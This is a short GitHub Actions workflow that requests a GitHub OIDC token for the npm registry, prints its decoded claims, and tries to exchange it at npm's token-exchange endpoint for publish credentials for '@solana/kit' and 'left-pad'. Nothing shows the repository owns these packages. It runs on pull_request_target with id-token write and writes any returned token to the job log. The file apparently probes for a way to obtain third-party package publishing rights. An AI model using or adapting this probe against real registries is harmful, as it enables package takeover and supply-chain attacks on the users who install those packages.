name: npm event probe
on:
  pull_request_target:
  workflow_dispatch:
permissions:
  contents: read
  id-token: write
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: claims and exchange
        run: |
          set -u
          echo "event=$GITHUB_EVENT_NAME ref=$GITHUB_REF"
          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO_OIDC_URL"; exit 0; fi
          RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org")
          JWT=$(printf '%s' "$RESP" | jq -r .value)
          P=$(printf '%s' "$JWT" | cut -d. -f2); PAD=$(( (4 - ${#P} % 4) % 4 )); P="$P$(printf '=%.0s' $(seq 1 $PAD))"
          printf '%s' "$P" | base64 -d 2>/dev/null | jq '{sub,event_name,ref,ref_type,environment,workflow_ref,repository}'
          for pkg in "%40solana%2Fkit" "left-pad"; do
            echo "== $pkg"
            curl -sS -o r.json -w "HTTP %{http_code}\n" -X POST -H "Authorization: Bearer $JWT" -H "Accept: application/json" "https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/$pkg"
            cat r.json; echo
          done
